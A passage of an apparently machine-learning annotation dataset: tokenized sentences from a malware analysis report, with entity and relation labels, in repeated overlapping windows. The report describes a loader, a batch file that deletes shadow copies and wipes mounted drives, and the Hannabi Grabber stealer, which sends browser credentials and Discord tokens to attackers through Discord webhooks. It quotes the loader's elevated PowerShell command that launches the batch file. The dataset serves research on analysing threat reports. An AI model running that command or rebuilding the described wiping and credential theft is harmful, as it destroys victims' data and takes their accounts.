"file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."], ["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."], ["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."], ["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."], ["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."]], "vertexSet": [[{"type": "MP", "sent_id": 2, "global_pos": [45, 45], "name": "payload", "pos": [12, 13], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "batch file", "pos": [28, 30], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "it", "pos": [33, 34], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [77, 77], "name": "Script.bat", "pos": [44, 45], "index": "3_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [92, 92], "name": "volume shadow copies", "pos": [12, 15], "index": "4_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [102, 102], "name": "mounted filesystems", "pos": [3, 5], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [157, 157], "name": "malware", "pos": [21, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "loader", "pos": [25, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "Hannabi Grabber", "pos": [37, 39], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [176, 176], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [178, 178], "name": "Discord Webhooks", "pos": [2, 4], "index": "10_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [181, 181], "name": "C2", "pos": [5, 6], "index": "11_0"}]], "labels": [{"r": "EX", "evidence": [2], "t": 2, "h": 3}, {"r": "RD", "evidence": [2, 3], "h": 0, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 0, "t": 4}, {"r": "RD", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "RD", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 4}, {"r": "RD", "evidence": [2, 3, 4], "h": 3, "t": 5}, {"r": "RD", "evidence": [2, 3, 4], "h": 3, "t": 5}, {"r": "WR", "evidence": [2, 3, 4], "h": 3, "t": 5}, {"r": "CO", "evidence": [2], "h": 1, "t": 2}, {"r": "FR", "evidence": [6], "h": 6, "t": 7}, {"r": "CO", "evidence": [6], "h": 7, "t": 8}, {"r": "CO", "evidence": [6, 7], "h": 7, "t": 9}, {"r": "FR", "evidence": [7], "h": 9, "t": 10}, {"r": "ST", "evidence": [7], "h": 10, "t": 11}, {"r": "RF", "evidence": [7], "h": 10, "t": 11}]}, {"title": "608-33", "sents": [["At", "the", "time", "of", "analysis", ",", "the", "C2", "server", "was", "no", "longer", "servicing", "requests", "on", "TCP/4444", "."], ["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", "file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."], ["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."], ["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."], ["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."], ["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."], ["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "payload", "pos": [12, 13], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "batch file", "pos": [28, 30], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "it", "pos": [33, 34], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [61, 61], "name": "Script.bat", "pos": [44, 45], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [76, 76], "name": "volume shadow copies", "pos": [12, 15], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [86, 86], "name": "mounted filesystems", "pos": [3, 5], "index": "5_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [141, 141], "name": "malware", "pos": [21, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [145, 145], "name": "loader", "pos": [25, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [157, 157], "name": "Hannabi Grabber", "pos": [37, 39], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 160], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [162, 162], "name": "Discord Webhooks", "pos": [2, 4], "index": "10_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [165, 165], "name": "C2", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [170, 170], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [188, 188], "name": "IPInfo service", "pos": [18, 20], "index": "13_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [201, 201], "name": "Discord server", "pos": [31, 33], "index": "14_0"}]], "labels": [{"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "RD", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 0, "t": 4}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 5}, {"r": "CO", "evidence": [1], "h": 1, "t": 2}, {"r": "FR", "evidence": [5], "h": 6, "t": 7}, {"r": "CO", "evidence": [5], "h": 7, "t": 8}, {"r": "CO", "evidence": [5, 6], "h": 7, "t": 9}, {"r": "CO", "evidence": [5, 6, 7], "h": 7, "t": 12}, {"r": "FR", "evidence": [6], "h": 9, "t": 10}, {"r": "ST", "evidence": [6], "h": 10, "t": 11}, {"r": "RF", "evidence": [6], "h": 10, "t": 11}, {"r": "IJ", "evidence": [7], "h": 12, "t": 13}, {"r": "ST", "evidence": [7], "h": 12, "t": 14}, {"r": "RF", "evidence": [7], "h": 12, "t": 14}]}, {"title": "608-34", "sents": [["Destructive", "MalwareIn", "another", "cluster", "we", "analyzed", ",", "we", "observed", "that", "the", "final", "payload", "hosted", "within", "IPFS", "was", "a", "Windows", "batch", "file", ",", "as", "shown", "below", ":", "When", "the", "batch", "file", "is", "retrieved", ",", "it", "is", "stored", "within", "the", "Network", "directory", "using", "the", "filename", "``", "Script.bat", "''", "."], ["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."], ["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."], ["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."], ["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."], ["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."], ["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "payload", "pos": [12, 13], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "batch file", "pos": [28, 30], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [33, 33], "name": "it", "pos": [33, 34], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [44, 44], "name": "Script.bat", "pos": [44, 45], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [59, 59], "name": "volume shadow copies", "pos": [12, 15], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [69, 69], "name": "mounted filesystems", "pos": [3, 5], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [124, 124], "name": "malware", "pos": [21, 22], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "loader", "pos": [25, 26], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "Hannabi Grabber", "pos": [37, 39], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [143, 143], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [145, 145], "name": "Discord Webhooks", "pos": [2, 4], "index": "10_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [148, 148], "name": "C2", "pos": [5, 6], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [153, 153], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [171, 171], "name": "IPInfo service", "pos": [18, 20], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [184, 184], "name": "Discord server", "pos": [31, 33], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [199, 199], "name": "malware", "pos": [9, 10], "index": "15_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [208, 208], "name": "Chrome", "pos": [18, 19], "index": "16_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "RD", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 3, "t": 4}, {"r": "RD", "evidence": [0, 1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [0, 1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [0, 1, 2], "h": 3, "t": 5}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [4], "h": 6, "t": 7}, {"r": "CO", "evidence": [4], "h": 7, "t": 8}, {"r": "CO", "evidence": [4, 5], "h": 7, "t": 9}, {"r": "CO", "evidence": [4, 5, 6], "h": 7, "t": 12}, {"r": "FR", "evidence": [5], "h": 9, "t": 10}, {"r": "ST", "evidence": [5], "h": 10, "t": 11}, {"r": "RF", "evidence": [5], "h": 10, "t": 11}, {"r": "IJ", "evidence": [6], "h": 12, "t": 13}, {"r": "ST", "evidence": [6], "h": 12, "t": 14}, {"r": "RF", "evidence": [6], "h": 12, "t": 14}, {"r": "RD", "evidence": [7], "h": 15, "t": 16}, {"r": "RD", "evidence": [7], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 15, "t": 16}]}, {"title": "608-35", "sents": [["This", "batch", "file", "is", "responsible", "for", "the", "following", "destructive", "behavior", ":", "Deleting", "volume", "shadow", "copies", "on", "the", "system", "."], ["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."], ["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."], ["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."], ["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."], ["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."], ["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [12, 12], "name": "volume shadow copies", "pos": [12, 15], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [22, 22], "name": "mounted filesystems", "pos": [3, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "malware", "pos": [21, 22], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "loader", "pos": [25, 26], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [93, 93], "name": "Hannabi Grabber", "pos": [37, 39], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [96, 96], "name": "It", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [98, 98], "name": "Discord Webhooks", "pos": [2, 4], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [101, 101], "name": "C2", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [124, 124], "name": "IPInfo service", "pos": [18, 20], "index": "9_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [137, 137], "name": "Discord server", "pos": [31, 33], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [152, 152], "name": "malware", "pos": [9, 10], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [161, 161], "name": "Chrome", "pos": [18, 19], "index": "12_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [173, 173], "name": "Mozilla Firefox", "pos": [6, 8], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [3], "h": 2, "t": 3}, {"r": "CO", "evidence": [3], "h": 3, "t": 4}, {"r": "CO", "evidence": [3, 4], "h": 3, "t": 5}, {"r": "CO", "evidence": [3, 4, 5], "h": 3, "t": 8}, {"r": "FR", "evidence": [4], "h": 5, "t": 6}, {"r": "ST", "evidence": [4], "h": 6, "t": 7}, {"r": "RF", "evidence": [4], "h": 6, "t": 7}, {"r": "IJ", "evidence": [5], "h": 8, "t": 9}, {"r": "ST", "evidence": [5], "h": 8, "t": 10}, {"r": "RF", "evidence": [5], "h": 8, "t": 10}, {"r": "RD", "evidence": [6], "h": 11, "t": 12}, {"r": "RD", "evidence": [6], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 11, "t": 12}, {"r": "RD", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "RD", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "WR", "evidence": [6, 7], "h": 11, "t": 13}]}, {"title": "608-36", "sents": [["Iterating", "through", "all", "mounted", "filesystems", "present", "on", "the", "system", "and", "deleting", "contents", "stored", "on", "them", "."], ["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."], ["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."], ["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."], ["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."], ["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."], ["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [3, 3], "name": "mounted filesystems", "pos": [3, 5], "index": "0_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "malware", "pos": [21, 22], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [62, 62], "name": "loader", "pos": [25, 26], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "Hannabi Grabber", "pos": [37, 39], "index": "3_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [77, 77], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "Discord Webhooks", "pos": [2, 4], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [82, 82], "name": "C2", "pos": [5, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [105, 105], "name": "IPInfo service", "pos": [18, 20], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [118, 118], "name": "Discord server", "pos": [31, 33], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [133, 133], "name": "malware", "pos": [9, 10], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [142, 142], "name": "Chrome", "pos": [18, 19], "index": "11_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [154, 154], "name": "Mozilla Firefox", "pos": [6, 8], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [167, 167], "name": "information stealer", "pos": [1, 3], "index": "13_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [173, 173], "name": "Discord", "pos": [7, 8], "index": "14_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [175, 175], "name": "Roblox", "pos": [9, 10], "index": "15_0"}]], "labels": [{"r": "FR", "evidence": [2], "h": 1, "t": 2}, {"r": "CO", "evidence": [2], "h": 2, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 4}, {"r": "CO", "evidence": [2, 3, 4], "h": 2, "t": 7}, {"r": "FR", "evidence": [3], "h": 4, "t": 5}, {"r": "ST", "evidence": [3], "h": 5, "t": 6}, {"r": "RF", "evidence": [3], "h": 5, "t": 6}, {"r": "IJ", "evidence": [4], "h": 7, "t": 8}, {"r": "ST", "evidence": [4], "h": 7, "t": 9}, {"r": "RF", "evidence": [4], "h": 7, "t": 9}, {"r": "RD", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [5], "h": 10, "t": 11}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "RD", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "RD", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 12}, {"r": "RD", "evidence": [5, 6, 7], "h": 10, "t": 14}, {"r": "RD", "evidence": [5, 6, 7], "h": 10, "t": 15}, {"r": "CO", "evidence": [5, 6, 7], "h": 10, "t": 13}, {"r": "RD", "evidence": [7], "h": 13, "t": 14}, {"r": "WR", "evidence": [7], "h": 13, "t": 14}, {"r": "RD", "evidence": [7], "h": 13, "t": 15}, {"r": "WR", "evidence": [7], "h": 13, "t": 15}]}, {"title": "608-37", "sents": [["Fortunately", "for", "victims", ",", "in", "the", "samples", "analyzed", "the", "loader", "incorrectly", "attempts", "to", "invoke", "the", "batch", "file", "as", "shown", "below", "."], ["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."], ["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."], ["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."], ["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."], ["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."], ["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."], ["If", "discovered", ",", "the", "malware", "will", "attempt", "to", "bypass", "them", "to", "obtain", "Discord", "tokens", "from", "the", "victim", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "malware", "pos": [21, 22], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "loader", "pos": [25, 26], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [58, 58], "name": "Hannabi Grabber", "pos": [37, 39], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "It", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "Discord Webhooks", "pos": [2, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [66, 66], "name": "C2", "pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [71, 71], "name": "It", "pos": [0, 1], "index": "6_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [89, 89], "name": "IPInfo service", "pos": [18, 20], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [102, 102], "name": "Discord server", "pos": [31, 33], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [117, 117], "name": "malware", "pos": [9, 10], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [126, 126], "name": "Chrome", "pos": [18, 19], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [138, 138], "name": "Mozilla Firefox", "pos": [6, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [151, 151], "name": "information stealer", "pos": [1, 3], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [157, 157], "name": "Discord", "pos": [7, 8], "index": "13_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [159, 159], "name": "Roblox", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [166, 166], "name": "malware", "pos": [4, 5], "index": "15_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [171, 171], "name": "them", "pos": [9, 10], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 0, "t": 1}, {"r": "CO", "evidence": [1], "h": 1, "t": 2}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "ST", "evidence": [2], "h": 4, "t": 5}, {"r": "RF", "evidence": [2], "h": 4, "t": 5}, {"r": "IJ", "evidence": [3], "h": 6, "t": 7}, {"r": "ST", "evidence": [3], "h": 6, "t": 8}, {"r": "RF", "evidence": [3], "h": 6, "t": 8}, {"r": "RD", "evidence": [4], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "RD", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "RD", "evidence": [4, 5, 6], "h": 9, "t": 13}, {"r": "RD", "evidence": [4, 5, 6], "h": 9, "t": 14}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 9, "t": 16}, {"r": "RD", "evidence": [4, 5, 6, 7], "h": 9, "t": 16}, {"r": "WR", "evidence": [4, 5, 6, 7], "h": 9, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "h": 9, "t": 12}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 9, "t": 15}, {"r": "RD", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "RD", "evidence": [6], "h": 12, "t": 14}, {"r": "WR", "evidence": [6], "h": 12, "t": 14}]}, {"title": "608-38", "sents": [["C", ":", "\\Windows\\system32\\cmd.exe", "/c", "cd", "%", "appdata", "%", "\\Microsoft\\Network", "&", "&", "powershell", "-Command", "start", "script.bat", "-Verb", "RunAsHannabi", "GrabberThe", "final", "cluster", "of", "malware", "associated", "with", "this", "loader", "is", "responsible", "for", "retrieving", "and", "executing", "a", "Python-based", "information", "stealer", "called", "Hannabi", "Grabber", "."], ["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."], ["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."], ["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."], ["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."], ["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."], ["If", "discovered", ",", "the", "malware", "will", "attempt", "to", "bypass", "them", "to", "obtain", "Discord", "tokens", "from", "the", "victim", "."], ["Application", "data", "that", "is", "collected", "is", "stored", "within", "a", "directory", "structure", "inside", "of", "the", "%", "TEMP", "%", "directory", ",", "in", "a", "folder", "called", "``", "RedDiscord", "''", "that", "is", "created", "by", "the", "malware", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "malware", "pos": [21, 22], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [25, 25], "name": "loader", "pos": [25, 26], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [37, 37], "name": "Hannabi Grabber", "pos": [37, 39], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "It", "pos": [0, 1], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "Discord Webhooks", "pos": [2, 4], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [45, 45], "name": "C2", 